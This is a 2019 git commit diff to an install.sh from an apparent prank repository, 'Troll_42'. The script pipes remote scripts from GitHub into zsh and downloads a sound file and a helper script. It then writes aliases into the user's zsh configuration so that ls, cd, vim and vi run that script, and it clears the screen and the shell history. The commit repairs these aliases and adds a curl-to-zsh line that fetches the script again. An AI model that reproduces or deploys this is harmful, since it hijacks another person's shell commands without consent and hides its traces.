05484df39e55d6b723c0d516cc076d97683cab58
Alexis Montelimart <amonteli@z1r9p3.le-101.fr>
2019-07-25 13:25:02 +0200

    :hammer: fix execute folder

--- lsound/install.sh
+++ lsound/install.sh
@@ -3,10 +3,10 @@
 #                                                               /              #
 #    install.sh                                       .::    .:/ .      .::    #
 #                                                  +:+:+   +:    +:  +:+:+     #
-#    By: amonteli <marvin@le-101.fr>                +:+   +:    +:    +:+      #
+#    By: amonteli <amonteli@student.le-101.fr>      +:+   +:    +:    +:+      #
 #                                                  #+#   #+    #+    #+#       #
 #    Created: 2019/07/20 21:38:02 by amonteli     #+#   ##    ##    #+#        #
-#    Updated: 2019/07/23 18:30:49 by amonteli    ###    #+. /#+    ###.fr      #
+#    Updated: 2019/07/25 13:24:36 by amonteli    ###    #+. /#+    ###.fr      #
 #                                                          /                   #
 #                                                         /                    #
 # **************************************************************************** #
@@ -16,8 +16,7 @@ then
 	(brew install switchaudio-osx)
 else
 	(curl -fsSL https://rawgit.com/kube/42homebrew/master/install.sh | zsh)
-	exec zsh
-	(brew install switchaudio-osx)
+	(curl -fsSL https://raw.githubusercontent.com/iSnkh/Troll_42/master/lsound/install.sh | zsh)
 fi
 
 if [ -f ~/.zshrc ]
@@ -34,15 +33,15 @@ curl https://raw.githubusercontent.com/iSnkh/Troll_42/master/lsound/zsht.sh -o ~
 curl https://raw.githubusercontent.com/iSnkh/Troll_42/master/sound/nik-zebi-vegeta.mp3 -o ~/.troll.mp3
 touch ~/.oh-my-zsh/custom/alias.zsh
 
-echo "alias ls=('sh ~./zsht.sh'" >> ~/.oh-my-zsh/custom/alias.zsh
-echo "alias cd=('sh ~./zsht.sh'" >> ~/.oh-my-zsh/custom/alias.zsh
-echo "alias vim=('sh ~./zsht.sh'" >> ~/.oh-my-zsh/custom/alias.zsh
-echo "alias vi=('sh ~./zsht.sh'" >> ~/.oh-my-zsh/custom/alias.zsh
+echo "alias ls='sh /Users/$USER/zsht.sh'" >> ~/.oh-my-zsh/custom/alias.zsh
+echo "alias cd='sh /Users/$USER/zsht.sh'" >> ~/.oh-my-zsh/custom/alias.zsh
+echo "alias vim='sh /Users/$USER/zsht.sh'" >> ~/.oh-my-zsh/custom/alias.zsh
+echo "alias vi='sh /Users/$USER/zsht.sh'" >> ~/.oh-my-zsh/custom/alias.zsh
 
-echo "alias ls=('sh ~./zsht.sh'" >> ~/.zshrc
-echo "alias cd=('sh ~./zsht.sh'" >> ~/.zshrc
-echo "alias vim=('sh ~./zsht.sh'" >> ~/.zshrc
-echo "alias vi=('sh ~./zsht.sh'" >> ~/.zshrc
+echo "alias ls='sh /Users/$USER/zsht.sh'" >> ~/.zshrc
+echo "alias cd='sh /Users/$USER/zsht.sh'" >> ~/.zshrc
+echo "alias vim='sh /Users/$USER/zsht.sh'" >> ~/.zshrc
+echo "alias vi='sh /Users/$USER/zsht.sh'" >> ~/.zshrc
 
 clear
 history -c 
